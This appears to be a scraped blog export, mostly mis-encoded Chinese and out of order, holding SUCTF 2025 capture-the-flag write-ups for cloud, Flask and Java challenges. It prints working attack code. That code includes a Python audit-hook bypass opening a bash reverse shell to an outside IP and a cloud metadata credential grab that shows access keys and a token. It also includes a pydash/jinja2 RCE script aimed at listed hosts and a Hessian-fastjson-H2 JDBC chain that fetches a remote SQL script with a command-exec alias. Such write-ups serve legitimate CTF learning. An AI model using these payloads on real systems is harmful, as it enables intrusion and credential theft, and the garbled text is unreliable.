java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new 